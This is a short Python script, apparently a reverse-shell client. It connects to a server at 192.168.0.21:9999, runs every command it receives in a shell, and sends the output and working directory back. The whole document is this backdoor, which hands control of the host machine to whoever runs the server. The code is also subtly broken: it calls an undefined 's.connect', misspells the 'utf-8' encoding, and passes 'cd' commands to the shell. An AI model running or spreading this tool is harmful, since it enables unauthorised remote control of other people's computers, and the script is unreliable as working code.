# connect to server
# wait on instruction
# receive and run instructions
# send results back to server

import socket
import os
import subprocess

sock = socket.socket()
host = '192.168.0.21'
port = 9999

# fucntion to bind client and host
s.connect((host,port))

while True:
    data = sock.recv(1024)
    #data checks
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8')) # capture directory change
    
    if len(data) > 0: # if not change directory command
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # displaying actions
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'uft-8')
        currentWD = os.getcwd() + '> ' # current working directory
        sock.send(str.encode(output_str + currentWD))# sending back to server
        
        print(output_str)